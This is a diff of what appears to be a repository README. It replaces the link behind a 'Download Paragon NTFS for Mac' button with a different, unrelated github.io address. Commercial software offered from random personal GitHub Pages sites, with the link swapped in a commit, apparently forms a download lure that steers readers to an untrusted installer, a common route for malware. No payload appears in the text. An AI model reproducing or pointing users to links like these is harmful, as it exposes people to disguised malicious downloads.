@@ -5,7 +5,7 @@
 </div>  
 
 <div align="center">  
-  <a href="https://manhyusuu48.github.io/.github/ParagonNTFS">  
+  <a href="https://tembilamusion.github.io/.github/ParagonNTFS">  
     <img src="https://img.shields.io/badge/⬇️_Download_Paragon_NTFS_for_Mac-0A84FF?style=for-the-badge&logo=apple&logoColor=white" alt="Download Paragon NTFS for Mac">  
   </a>  
 </div>  
